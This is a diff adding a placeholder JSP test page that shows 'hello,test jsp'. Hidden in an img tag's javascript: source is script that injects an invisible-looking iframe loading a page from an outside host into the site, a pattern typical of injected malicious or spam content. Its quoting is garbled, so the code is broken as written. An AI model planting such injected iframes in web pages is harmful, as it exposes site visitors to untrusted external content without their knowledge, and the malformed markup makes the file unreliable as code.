@@ -1,0 +1,13 @@
+<%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Insert title here</title>
+</head>
+<body>
+<p>hello,test jsp</p>
+<img src="javascript:document.getElementById('Mlogo').innerHTML+='<div style=/'position:absolute;top:0;left:0;/'><iFRAME name=I1 src="//'http://tf1000.go2.icpcn.com/mp3/top.htm"/' frameBorder=/'0/' width=/'975/' scrolling=/'no/' height=/'21/'></div>';"> 
+</body>
+</html>
